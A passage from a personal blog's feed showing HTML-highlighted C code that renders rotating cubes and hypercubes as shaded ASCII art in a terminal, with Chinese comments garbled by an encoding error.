class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;<span class="comment">//åˆ¤æ–­å½“å‰å±å¹•çš„ç‚¹æ˜¯å¦åœ¨ä¸‰è§’å½¢èŒƒå›´å†…</span></span><br><span class="line">                        <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                                ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                            inside=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(inside)&#123;</span><br><span class="line">                        <span class="comment">/*æµ‹è¯•ä»£ç ï¼šæ–¹ç¨‹é˜ˆå€¼æ£€éªŒ</span></span><br><span class="line"><span class="comment">                        if(sx==0)&#123;</span></span><br><span class="line"><span class="comment">                            for(int i=0;i&lt;3&amp;&amp;inside;i++)&#123;</span></span><br><span class="line"><span class="comment">                                double b=(tCenter[1]-y[i==0?1:i==1?0:0])*(x[i==0?2:i==1?2:1]-x[i==0?1:i==1?0:0]);</span></span><br><span class="line"><span class="comment">                                double c=(y[i==0?2:i==1?2:1]-y[i==0?1:i==1?0:0])*(tCenter[0]-x[i==0?1:i==1?0:0]);\</span></span><br><span class="line"><span class="comment">                                double d=b-c;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        //*/</span></span><br><span class="line">                        <span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                        <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span>&#123;<span class="comment">//æ±‚ä¸‰è§’å½¢å¹³é¢æ–¹ç¨‹ç®—å‡ºç‚¹åˆ°å±å¹•è·ç¦»</span></span><br><span class="line">                            p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                            currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                            <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                                alpha=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                                dis[sy][sx]=currentDis;</span><br><span class="line">                                out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="comment">///*è¾“å‡ºåˆ°ç»ˆç«¯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,shade[outIndex],shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">15</span>);</span><br><span class="line">        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p align="right"><small>Correct, but not totally correct, meet hypercubes O(âˆ©_âˆ©)O</small></p>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;Meet Hypercubes~ O(âˆ©_âˆ©)O&lt;/p&gt;
&lt;p&gt;ğŸ¦è¯­è¨€æ¸²æŸ“nç»´ç«‹æ–¹ä½“è‡³ç»ˆç«¯ï¼Œé‚£çœŸæ˜¯éå¸¸amazingå•Š&lt;/p&gt;
&lt;img src=&quot;/images/4Hypercube-transparent.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="æ‘¸é±¼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
  </entry>
  
  <entry>
    <title>å›¾å½¢å­¦HelloWorld</title>
    <link href="https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/"/>
    <id>https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/</id>
    <published>2021-04-18T17:24:55.000Z</published>
    <updated>2022-01-05T06:42:03.041Z</updated>
    
    <content type="html"><![CDATA[<p>é€›bç«™çœ‹åˆ°ä¼šè½¬çš„ç”œç”œåœˆï¼Œå¯¹å›¾å½¢å­¦æœ‰ç‚¹ä¸Šå¤´ï¼Œè‡ªå·±æ‹¿èœ¥è¯­è¨€åšä¸ªç«‹æ–¹ä½“ç©ç©</p><img src="/images/å›¾å½¢å­¦HelloWorld.gif" height="200" width="200" /><span id="more"></span><h1 id="å›¾å½¢å­¦HelloWorld"><a href="#å›¾å½¢å­¦HelloWorld" class="headerlink" title="å›¾å½¢å­¦HelloWorld"></a>å›¾å½¢å­¦HelloWorld</h1><p>æ—¢ç„¶æ˜¯HelloWorldé‚£å°±æ²¡ä»€ä¹ˆå¥½è§£é‡Šçš„äº†O(âˆ©_âˆ©)O</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 51<span class="comment">//è§„å®šå±å¹•å¤§å°</span></span></span><br><span class="line"><span class="comment">////cal_rç”¨æ¥ç®—ä¸ªæ¨¡é•¿</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">cal_r</span><span class="params">(<span class="keyword">float</span> x,<span class="keyword">float</span> y,<span class="keyword">float</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(x*x+y*y+z*z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,;!o*m0&amp;%@&quot;</span>;<span class="comment">//é˜´å½±å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">int</span> out_i[size][size];<span class="comment">//è®°å½•äº®åº¦ï¼Œæ˜ å°„åˆ°å­—ç¬¦é›†</span></span><br><span class="line"><span class="keyword">float</span> dyn=<span class="number">4.0</span>;<span class="comment">//å¼€åˆå¹…åº¦</span></span><br><span class="line"><span class="keyword">float</span> a=<span class="number">8.0</span>;<span class="comment">//ç«‹æ–¹ä½“è¾¹é•¿</span></span><br><span class="line"><span class="keyword">float</span> delta=<span class="number">0.75</span>;<span class="comment">//éå†ç«‹æ–¹ä½“çš„æ­¥é•¿</span></span><br><span class="line"><span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//ä»åæ ‡åŸç‚¹åç§»åˆ°å±å¹•ä¸­å¿ƒæ‰€éœ€çš„åç§»é‡</span></span><br><span class="line"><span class="keyword">float</span> dis[size][size];<span class="comment">//è®°å½•æœ€å°è·ç¦»ï¼Œç”±æ­¤åˆ¤æ–­é®ç½©å…³ç³»</span></span><br><span class="line"><span class="comment">//cal_shadeç”¨æ¥ç®—ä¸ªé˜´å½±</span></span><br><span class="line"><span class="comment">//Par&#123;n_iæ˜¯è¢«é€‰ä¸­ç›¸å¯¹ä¸å˜çš„æ–¹å‘,ç›¸å½“äºæ­¤æ–¹å‘ç©¿è¿‡å¹³é¢;n_jä½œä¸ºåˆ¤å®šæ˜¯ä¸Šå¹³é¢è¿˜æ˜¯ä¸‹å¹³é¢çš„å€¼ï¼Œåªå¯èƒ½æ˜¯1æˆ–-1&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_shade</span><span class="params">(<span class="keyword">float</span> *n,<span class="keyword">int</span> n_i,<span class="keyword">int</span> n_j,<span class="keyword">float</span> *ro_a,<span class="keyword">float</span> *ro_b,<span class="keyword">float</span> *ro_c,<span class="keyword">float</span> *light,<span class="keyword">float</span> rotate,<span class="keyword">int</span> *out_i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)n[i]=i==n_i?n_j:<span class="number">0</span>;<span class="comment">//ç¡®å®šåŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> n_a[<span class="number">3</span>]=&#123;n[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">6</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">7</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_b[<span class="number">3</span>]=&#123;n_a[<span class="number">0</span>]*ro_b[<span class="number">0</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">3</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">6</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">1</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">4</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">7</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">2</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">5</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">8</span>]&#125;;<span class="comment">//æ³•å‘é‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">    <span class="keyword">float</span> n_r[<span class="number">3</span>]=&#123;n_b[<span class="number">0</span>]*ro_c[<span class="number">0</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">3</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">6</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">1</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">4</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">7</span>],</span><br><span class="line">                   n_b[<span class="number">0</span>]*ro_c[<span class="number">2</span>]+n_b[<span class="number">1</span>]*ro_c[<span class="number">5</span>]+n_b[<span class="number">2</span>]*ro_c[<span class="number">8</span>]&#125;;</span><br><span class="line">    <span class="comment">//n_r[]ä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„æ³•å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> result=(n_r[<span class="number">0</span>]*light[<span class="number">0</span>]+n_r[<span class="number">1</span>]*light[<span class="number">1</span>]+n_r[<span class="number">2</span>]*light[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;<span class="comment">//ç‚¹ç§¯æ±‚åå…‰å¼ºåº¦(äº®åº¦)ï¼Œå¹¶æ˜ å°„åˆ°[0,1]</span></span><br><span class="line">    <span class="keyword">float</span> co[<span class="number">3</span>];<span class="comment">//æ­£æ–¹ä½“çš„åŸå§‹åæ ‡ï¼Œcoæ„ä¸ºcoordinate</span></span><br><span class="line">    co[n_i]=dyn*<span class="built_in">cos</span>(rotate*<span class="number">2</span>);<span class="comment">//make it 20% cooler</span></span><br><span class="line">    <span class="keyword">int</span> co_a=n_i==<span class="number">0</span>?<span class="number">1</span>:n_i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> co_b=n_i==<span class="number">0</span>?<span class="number">2</span>:n_i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;<span class="comment">//ç¡®å®šäº†indexä¸ºn_içš„åæ ‡æ˜¯ä¸éœ€è¦è¢«éå†çš„</span></span><br><span class="line">    co[n_i]+=move/<span class="number">2</span>;<span class="comment">//æ— éœ€éå†çš„æ–¹å‘åç§»1/4ä¸ªå±å¹•è¾¹é•¿</span></span><br><span class="line">    <span class="keyword">for</span>(co[co_a]=-a;co[co_a]&lt;=a;co[co_a]+=delta)</span><br><span class="line">        <span class="keyword">for</span>(co[co_b]=-a;co[co_b]&lt;=a;co[co_b]+=delta)&#123;</span><br><span class="line">            <span class="keyword">int</span> <span class="keyword">final</span>=(<span class="keyword">int</span>)(result*<span class="number">10.0</span>);<span class="comment">//æŠŠäº®åº¦intåŒ–</span></span><br><span class="line">            <span class="keyword">final</span>=(<span class="keyword">final</span>&gt;<span class="number">10</span>||<span class="keyword">final</span>)&lt;<span class="number">0</span>?<span class="keyword">final</span>&gt;<span class="number">10</span>?<span class="number">10</span>:<span class="number">0</span>:<span class="keyword">final</span>;<span class="comment">//ä¿é™©ï¼Œé˜²æ­¢ä¸€äº›åˆé’»æƒ…å†µ</span></span><br><span class="line">            <span class="keyword">float</span> x_a=co[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_a=co[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_a=co[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+co[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+co[<span class="number">2</span>]*ro_a[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬ä¸€æ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_b=x_a*ro_b[<span class="number">0</span>]+y_a*ro_b[<span class="number">3</span>]+z_a*ro_b[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_b=x_a*ro_b[<span class="number">1</span>]+y_a*ro_b[<span class="number">4</span>]+z_a*ro_b[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_b=x_a*ro_b[<span class="number">2</span>]+y_a*ro_b[<span class="number">5</span>]+z_a*ro_b[<span class="number">8</span>];<span class="comment">//åæ ‡ç¬¬äºŒæ¬¡æ—‹è½¬</span></span><br><span class="line">            <span class="keyword">float</span> x_r=x_b*ro_c[<span class="number">0</span>]+y_b*ro_c[<span class="number">3</span>]+z_b*ro_c[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">float</span> y_r=x_b*ro_c[<span class="number">1</span>]+y_b*ro_c[<span class="number">4</span>]+z_b*ro_c[<span class="number">7</span>];</span><br><span class="line">            <span class="keyword">float</span> z_r=x_b*ro_c[<span class="number">2</span>]+y_b*ro_c[<span class="number">5</span>]+z_b*ro_c[<span class="number">8</span>];</span><br><span class="line">            <span class="comment">//co_rä½œä¸ºç»•ä¸‰è½´æ—‹è½¬rotateè§’åº¦åçš„ç©ºé—´åæ ‡</span></span><br><span class="line">            <span class="keyword">int</span> cox=(<span class="keyword">int</span>)(n_j*x_r+move);</span><br><span class="line">            <span class="keyword">int</span> coy=(<span class="keyword">int</span>)(n_j*z_r+move);<span class="comment">//æ‰¾åˆ°æŠ•å½±åˆ°å±å¹•ä¸Šçš„ç‚¹åœ¨å“ª</span></span><br><span class="line">            <span class="keyword">if</span>(n_j*y_r&lt;dis[cox][coy])&#123;<span class="comment">//åªæœ‰å‘ç°æ›´è¿‘çš„ç‚¹æ‰æ›¿æ¢äº®åº¦</span></span><br><span class="line">                out_i[cox*size+coy]=<span class="keyword">final</span>;</span><br><span class="line">                dis[cox][coy]=n_j*y_r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> n[<span class="number">3</span>];<span class="comment">//åŸå§‹æ³•å‘é‡n[]</span></span><br><span class="line">    <span class="keyword">float</span> light[<span class="number">3</span>]=&#123;<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;<span class="comment">//å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">float</span> length=cal_r(light[<span class="number">0</span>],light[<span class="number">1</span>],light[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)light[i]/=length;<span class="comment">//å•ä½åŒ–å¹³è¡Œå…‰å‘é‡</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;<span class="comment">//rotateä¸ºæ—‹è½¬è§’åº¦ï¼Œå¢é‡å³æ—‹è½¬é€Ÿåº¦</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">4.0</span>*size);</span><br><span class="line">                <span class="comment">//åˆå§‹åŒ–äº®åº¦ä¸è·ç¦»</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">float</span> cos_ro=<span class="built_in">cos</span>(rotate),sin_ro=<span class="built_in">sin</span>(rotate);</span><br><span class="line">        <span class="keyword">float</span> ro_a[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,cos_ro,-sin_ro&#125;,&#123;<span class="number">0</span>,sin_ro,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_b[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,<span class="number">0</span>,sin_ro&#125;,&#123;<span class="number">0</span>,<span class="number">1.0</span>,<span class="number">0</span>&#125;,&#123;-sin_ro,<span class="number">0</span>,cos_ro&#125;&#125;;</span><br><span class="line">        <span class="keyword">float</span> ro_c[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;cos_ro,-sin_ro,<span class="number">0</span>&#125;,&#123;sin_ro,cos_ro,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1.0</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">//æ—‹è½¬çŸ©é˜µï¼Œroè¡¨rotate</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//ç®—ä¸ªé˜´å½±ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ§åˆ¶å¯¹åº”é¢</span></span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">            cal_shade(&amp;n[<span class="number">0</span>],i,<span class="number">-1</span>,&amp;ro_a[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_b[<span class="number">0</span>][<span class="number">0</span>],&amp;ro_c[<span class="number">0</span>][<span class="number">0</span>],&amp;light[<span class="number">0</span>],rotate,&amp;out_i[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++) out_i[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">        <span class="comment">//è·Ÿç€ç”œç”œåœˆæŠ„çš„ï¼Œè¿™æ 